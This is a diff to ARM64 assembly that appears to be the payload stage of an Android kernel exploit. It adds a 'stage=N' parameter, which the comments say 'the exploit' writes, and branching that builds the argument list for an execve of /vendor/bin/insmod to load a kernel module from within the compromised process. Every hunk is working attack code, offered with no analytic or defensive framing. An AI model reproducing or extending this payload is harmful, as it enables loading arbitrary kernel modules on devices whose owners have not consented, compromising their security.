@@ -31,6 +31,10 @@ param_pkg:
     .ascii "package_name="
 pkg_val:
     .skip 48, 0
+param_stage:
+    .ascii "stage="                 /* value written at stage_val before insmod */
+stage_val:
+    .skip 12, 0                     /* "N\0" plus slack; exploit writes the digit */
 
     .balign 4
     .global libcxx_ko_target_off
@@ -42,6 +46,9 @@ libcxx_soft_reboot_off:
     .global libcxx_pkg_val_off
 libcxx_pkg_val_off:
     .int pkg_val - libcxx_data
+    .global libcxx_stage_val_off
+libcxx_stage_val_off:
+    .int stage_val - libcxx_data
 soft_reboot_flag:
     .byte 0
 
@@ -130,13 +137,28 @@ libcxx_start:
     svc     0
 
     // execve("/vendor/bin/insmod",
-    //        [exe_path, ko_target, "package_name=<pkg>", ["soft_reboot=1",] NULL], NULL)
+    //        [exe_path, ko_target, "package_name=<pkg>", ["stage=N",]
+    //        ["soft_reboot=1",] NULL], NULL)
     adr     x1, exe_path
     str     x1, [sp]
     adr     x1, ko_target
     str     x1, [sp, 8]
     adr     x1, param_pkg
     str     x1, [sp, 16]
+    // stage is only passed when the exploit wrote a digit at stage_val
+    adr     x1, stage_val
+    ldrb    w9, [x1]
+    cbz     w9, insmod_no_stage
+    adr     x1, param_stage
+    str     x1, [sp, 24]
+    adr     x9, soft_reboot_flag
+    ldrb    w9, [x9]
+    cbz     w9, insmod_no_sr
+    adr     x1, param_soft_reboot
+    str     x1, [sp, 32]
+    str     xzr, [sp, 40]
+    b       do_insmod
+insmod_no_stage:
     adr     x9, soft_reboot_flag
     ldrb    w9, [x9]
     cbz     w9, insmod_no_sr
